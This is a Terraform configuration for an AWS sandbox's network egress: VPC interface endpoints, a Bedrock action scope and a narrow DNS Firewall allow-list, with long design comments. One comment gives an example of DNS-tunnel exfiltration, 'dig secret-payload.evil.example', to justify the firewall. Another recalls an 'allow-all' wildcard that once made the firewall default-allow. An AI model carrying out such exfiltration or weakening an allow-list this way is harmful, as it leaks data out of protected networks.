# sandbox/egress/ - the [E] metered network of a business unit's sandbox (Stage 3 pass 3): the
# interface endpoints of step 8's Sandbox list, step 9's org policy on every one of them, and the
# DNS Firewall. The repository's first [E] slice: its lifecycle belongs to `make up ENV=sandbox` /
# `make down ENV=sandbox` (D11), never to a by-hand apply (runbook, "What you never do"). A forgotten
# session costs ~USD 3.84/day and no budget alert exists to say so (D12); `./aws/egress.py` 6 is the
# burn meter that risk gets.
#
# foundation/'s [P] facts arrive through terraform_remote_state - the read its outputs.tf announces -
# never pasted (Lesson 3) and never looked up by tag: a tag lookup answers "what matches", remote
# state answers "what foundation/ built".

data "terraform_remote_state" "foundation" {
  backend = "s3"

  config = {
    bucket = "awsds-${var.env}-tfstate"
    key    = "${var.account_folder}/foundation/terraform.tfstate"
    region = var.region
  }
}

module "egress" {
  # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.14.1"

  env    = var.env
  vpc_id = data.terraform_remote_state.foundation.outputs.vpc_id

  # Single-AZ resources land in the first authored zone (D9); the maps stay keyed by zone id, so
  # this is a selection, not an anchor on list position.
  #
  # `egress_mode`, `nat_public_subnet_id` and `private_route_table_ids` went with the NAT at
  # `vpc-egress-v0.6.0` (6c step 5.1). Under D38 the estate has one internet exit - an explicit proxy
  # in the hub - and no VPC anywhere carries a default route, so there is no design to select and no
  # route table for this slice to write to.
  endpoint_subnet_id         = data.terraform_remote_state.foundation.outputs.private_subnet_ids[var.zone_ids[0]]
  endpoint_security_group_id = data.terraform_remote_state.foundation.outputs.endpoints_security_group_id

  # Stage 6e step 4.4 - the invocation door, narrowed on the action axis.
  #
  # THE RUNTIME ENDPOINT ONLY, AND THE CONTROL PLANE DELIBERATELY NOT. `bedrock-runtime` carries
  # invocation for every consumer this account has or will have, so naming the two invoke actions
  # is a statement about the service rather than about one caller: any future runtime API - an
  # async invoke, a bidirectional stream - does not silently acquire this door. `bedrock` is a
  # growing control plane that the six SMUS AmazonBedrock* blueprints call for things a coding
  # assistant never does (CreateGuardrail, CreateEvaluationJob), and since 2026-09-12 both
  # endpoints are always-on infrastructure shared by both consumers. A list written for one of
  # them would silently refuse the other, with no denial that names this policy, so the control
  # plane keeps `Action = "*"` under the organization condition like the other eighteen.
  #
  # WHAT THIS GIVES UP, stated rather than discovered later: `PutAccountDataRetention` and
  # `PutModelInvocationLoggingConfiguration` are control-plane calls and still traverse their
  # endpoint. The first is covered org-wide by Stage 6e step 7.5's SCP, which is the right layer
  # for it; the second is Stage 11 step 5.6's question and has no control here yet.
  #
  # An action absent from a scoped list gets no response and no denial naming this policy, so an
  # addition belongs with a measured refusal rather than with a guess.
  endpoint_action_scopes = {
    "bedrock-runtime" = [
      "bedrock:InvokeModel",
      "bedrock:InvokeModelWithResponseStream",
    ]
  }

  # Step 8.3, the Sandbox row: the three SageMaker endpoints (sagemaker.studio is what lets
  # JupyterLab/Code Editor apps start in a VPC-only domain). elasticfilesystem sat here until
  # 2026-08-17, when the NFS requirement was withdrawn (D24 with it).
  #
  # An interface endpoint's private DNS zone is authoritative for the whole subtree, so no endpoint
  # whose zone shadows a name the client plane requires may live in the VPC the client resolves
  # through. Measured 2026-08-24 (Lessons 40-42): a `datazone` endpoint here made
  # agent.datazone.<region>.api.aws NXDOMAIN for every client of the VPC resolver, the full-tunnel
  # laptop included, and the portal broke on the VPN. The rule is not about `datazone` - any endpoint
  # seizing an `api.aws` spelling inherits it.
  #
  # The rest of the required table (docs/SMUS.md §VpcOnly, fifteen names) is added by measurement
  # rather than by copying: verification (viii) reads the flow logs of a working session and only
  # what is exercised gets an endpoint, at +USD 0.010/h each, per account, for the whole session.
  #
  # Two entries of that table cannot be settled by adding them here:
  #   s3   this account already has a [P] gateway endpoint whose prefix-list route is more specific
  #        than any default, so S3 traffic may never reach an interface endpoint at all - and the
  #        request then presents the gateway's aws:SourceVpce. Which one wins, per project subnet, is
  #        verification (xix), and flow logs are the wrong instrument (gateway traffic crosses no
  #        ENI): the field is CloudTrail's vpcEndpointId.
  #   q    the doc pairs it with com.amazonaws.US-EAST-1.codewhisperer, and an interface endpoint is
  #        regional. It was struck from step 5.2's list because no such endpoint service exists in
  #        this Region, only `qapps` and the `quicksight*` family.
  #
  # With no default route anywhere, a service without an endpoint here has no path at all. Every name
  # below was checked against the Region's own catalog on the day it was added -
  # `describe-vpc-endpoint-services`, 569 entries - which is what step 5.2's "measure rather than
  # copy" asks for.
  extra_services = [
    # The SMUS surface, unchanged since Stage 3.
    "sagemaker.api",
    "sagemaker.runtime",
    "sagemaker.studio",

    # The Bedrock pair, always on since 2026-09-12 (Stage 6e step 4, the user's restructure). They
    # were an optional group first, and the flag was the wrong shape for them: a group is per apply
    # and a `make up` without it destroys what it created, while the assistant needs this path in
    # every session a space runs. ~USD 0.020/h, which moves this account's endpoint set from 18 to
    # 20 and the estate's fixed rate from 0.390 to 0.410 USD/h while the slice is up.
    #
    # `bedrock` is here as well as `bedrock-runtime` because the client resolves an alias to a
    # profile that exists in this account before it invokes anything - ListInferenceProfiles and
    # GetInferenceProfile are control-plane calls, and without the endpoint they leave through the
    # proxy while the invocation does not.
    #
    # `GROUPS=bedrock` now adds only the agent pair (vpc-egress-v0.14.0) and a blueprint that needs
    # them finds this control plane already up.
    "bedrock",
    "bedrock-runtime",

    # `S3TableCatalog` is one of category 1's eleven blueprints and the S3 gateway endpoint does not
    # cover it: a gateway carries `s3` and `dynamodb`, nothing else, while `s3tables` is its own
    # service name in the Region's catalog (measured 2026-09-06). Always-on rather than behind 5.3's
    # flag, by the user's decision: one endpoint at ~USD 0.010/h, and the blueprint is enabled.
    "s3tables",

    # The tunnel is in VPC-Networking, which by decision carries no interface endpoint at all, so a
    # private zone here cannot reach the client plane (Lessons 40-43). What resolves this privately
    # is a SageMaker app in this VPC calling the portal's API.
    "datazone",

    # Session Manager's three, which 5.5 requires of every instance-bearing spoke. Session Manager
    # does not work through an HTTPS proxy listener, so the shell that reads the proxy's own log
    # must not depend on the proxy (Lesson 24). The hub's two hosts reach SSM through the IGW
    # instead and need none.
    "ssm",
    "ssmmessages",
    "ec2messages",

    # `ec2` for the describe calls SageMaker and EMR make on the account's own network objects, and
    # `secretsmanager` for a job reading a credential - both covered by the NAT until it went.
    "ec2",
    "secretsmanager",
  ]

  # The optional families, empty unless `make up ENV=sandbox GROUPS=...` names one. Wired here and
  # in no other egress slice: the blueprints these serve are SMUS blueprints and the SMUS surface
  # lives in this account alone - 6b removed it from Staging, and Production is a deployment target.
  # When a Production workload asks for Bedrock, that slice gets the same two lines and the module
  # already knows the answer.
  optional_service_groups = var.optional_service_groups

  # The firewall's job is the resolver, not the route (6c step 5.7). Step 5.1 removed the last
  # default route in the estate (D38), so nothing in this VPC can open an internet connection except
  # as a client of the proxy, and an explicit-proxy client never resolves the name it is asking for -
  # Squid does. Removing the route did not close the resolver: `curl https://evil.example` cannot
  # leave this VPC, but `dig secret-payload.evil.example` would have, one label at a time, through
  # the VPC's own recursive resolver. Closing that channel is this control's remaining job, which is
  # why the list below is ten entries rather than sixty-three: names this VPC must resolve in order
  # to function, and nothing else.
  dns_firewall = true

  # Kept at TRUST. Squid matches the hostname the client requested, so no CNAME chain is evaluated
  # anywhere in the estate; the only names left below are AWS's own namespaces and this estate's own
  # private zones, so the chain beneath an entry is pointed by AWS or by us. INSPECT would turn any
  # AWS-internal CNAME leaving `*.amazonaws.com` into a resolution failure with no owner and no
  # remedy.
  firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"

  # Every package host, every console family, every sign-in name and the one CDN wildcard moved to
  # the proxy's source-scoped allow-lists in `production/networking/` (step 4.9), where they became
  # two filters instead of one: what a person on the tunnel may reach is no longer the same set as
  # what a notebook may reach. A VPC has one resolver, so this list could never express that split.
  #
  # A `"*"` came off here. Commit `f6bb316` ("allow-all egress", 2026-08-23) put a single wildcard at
  # the top of this list; `*` matches every name, so the sixty-two entries beneath it were decoration
  # and the firewall was a default-allow. A list whose first entry is `*` reads as a configured
  # control to every review that does not read it to the end (Lesson 5).
  #
  # EXC-04, EXC-05 and EXC-06 close with the old list, and EXC-05's failure mode retires outright
  # rather than moving: it needed a resolver evaluating a redirection chain and blaming the original
  # name for a hop's absence. The filter that replaced it never sees a chain.
  dns_firewall_allow_domains = [
    # Every entry carries a trailing dot - `EXC-04`'s repair, not a style. Route 53 Resolver
    # canonicalises a domain list as FQDNs and returns `amazonaws.com.`; written without one, the
    # provider compared two spellings of the same list and re-issued `UpdateFirewallDomains` on every
    # apply, so `terraform plan` read `0 to add, 2 to change` immediately after a successful apply of
    # this code. Measured on a live list before being written: dotting these entries alone took the
    # plan from `2 to change` to `1 to change`, and `vpc-egress-v0.10.0` dots the module's catch-all
    # for the other half.
    #
    # AWS's own namespaces. Every regional service endpoint lives under one of these and they cannot
    # be enumerated, so they are wildcards rather than names. The apex is listed beside each wildcard
    # because a Route 53 domain-list wildcard never matches the apex itself. Squid collapses that
    # syntax: there, `.amazonaws.com` covers both and listing the apex beside it is fatal. Two
    # systems, one intent, two spellings (Lesson 53).
    "amazonaws.com.", "*.amazonaws.com.",
    "api.aws.", "*.api.aws.",

    # `sagemaker.aws` is covered by neither of the above, and omitting it is how this slice would pay
    # hourly for an endpoint nothing can resolve: `sagemaker.studio` answers on
    # `*.studio.<region>.sagemaker.aws`, a different TLD entirely. `vpc-egress-v0.8.0`'s precondition
    # turns that from a silent NXDOMAIN into a plan-time failure naming the endpoint.
    "sagemaker.aws.", "*.sagemaker.aws.",

    # `app.aws` and `on.aws` are two more families of endpoints this VPC already pays for (6d step
    # 8.8, 2026-09-09, the user's decision). An interface endpoint answers for several names and the
    # module used to read only the service's canonical one, so two of them were invisible to the
    # coverage check. Read from the endpoints themselves -
    #
    #   ecr.dkr           dkr-ecr.<region>.on.aws            (and `*.dkr-ecr.<region>.on.aws`)
    #   sagemaker.studio  studio.sagemaker.<region>.app.aws  (and its wildcard)
    #
    # - both NXDOMAIN in this VPC until now: a paid endpoint unreachable by one of its names, which
    # reads as a network fault rather than as a policy decision.
    #
    # `on.aws` also makes `dzd-<id>.sagemaker.<region>.on.aws` resolvable - the Unified Studio
    # domain's own URL, which 6d step 8.6 recorded as a DNS BLOCK from every space address and could
    # attribute to nothing. Resolving is not reaching: that name has no endpoint, so it leaves as a
    # proxy request and comes back a 403 naming the host. The reach question is the plane's, and this
    # list does not answer it (D38).
    "app.aws.", "*.app.aws.",
    "on.aws.", "*.on.aws.",

    # The estate's own private zones - `proxy.awsds.internal` and `gitlab.awsds.internal` among them,
    # which is why a client can be told to use a name for the proxy rather than an address. Listed as
    # siblings because `awsds.internal` does not cover `awsds-pages.internal`: a different label, not
    # a subdomain. The old family (`sandbox.internal`, `prod.internal`, `pages.internal`) is absent -
    # an entry here is what would keep a retired zone alive past step 2.6.
    "awsds.internal.", "*.awsds.internal.",
    "awsds-pages.internal.", "*.awsds-pages.internal.",
  ]

  # The rule group associates to the VPC id rather than to a route table, so it filters every host
  # in this VPC, whether or not this slice is what gives that host a path. It used to filter
  # `sandbox/buildbox/`, whose egress left through the WireGuard NAT instance and never touched this
  # slice, which is how "a build must run with egress/ down" became a rule; that host moved to
  # `production/buildbox/` at 6c step 5.8.

  # Absent by decision, recorded so it reads as a control rather than an oversight (Lesson 5; Stage 6
  # decision 3, 2026-08-19): Athena Spark's three session endpoints - athena.sessions (Spark
  # Connect), athena.dashboard (Live UI) and athena.persistent-dashboard (History Server). Athena
  # Spark runs its executors outside this VPC - there is no NetworkConfiguration in its API - so a
  # notebook on it sits outside these endpoints, the flow logs and every aws:SourceVpce condition.
  # The preventive half is the SCP deny on athena:StartSession/UpdateSession (Stage 6 step 1.6); not
  # creating these is the network half, and it is a choice since the 2026-04 PrivateLink release,
  # not a property of the service.
  #
  # The SQL path is unaffected and must stay that way: Athena SQL rides the `athena` API endpoint
  # (the module's core list), which is what D13 depends on. Three names in the same family, two
  # different products.
  #
  # Revision trigger: Athena Spark gaining executors in this estate's subnets under its security
  # group - never a headline saying it "supports VPC", which is about the control path.

}
